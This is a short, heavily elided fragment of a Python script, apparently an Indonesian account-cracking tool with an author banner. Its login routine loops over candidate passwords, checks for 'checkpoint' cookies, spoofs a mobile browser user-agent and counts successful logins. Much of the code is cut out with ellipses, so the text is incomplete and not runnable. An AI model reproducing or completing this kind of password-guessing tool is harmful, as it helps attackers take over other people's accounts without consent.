...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mRifky_dem_xy')
...
def banner():
    ...
    {m}•{k}•{h}•{sir} AUTHOR : Rifkydem {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 11; SM-A032M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"}
				if 'no' in taplikasi:
					ok+=1
